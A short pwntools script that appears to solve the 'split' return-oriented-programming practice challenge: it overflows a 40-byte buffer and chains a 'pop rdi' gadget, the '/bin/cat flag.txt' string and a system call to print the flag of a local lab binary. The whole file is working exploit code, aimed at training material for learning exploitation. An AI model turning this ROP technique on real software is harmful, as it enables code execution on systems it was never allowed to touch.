from pwn import *
elf = context.binary = ELF("./split")
rop = ROP(elf)
p = process()
junk = 40
system = p64(elf.sym["usefulFunction"] + 9)
rdi = p64(rop.find_gadget(["pop rdi"])[0])
cat = p64(next(elf.search(b"/bin/cat flag.txt")))
payload = b"A" * junk + rdi + cat + system

p.sendline(payload)
print(p.recvall())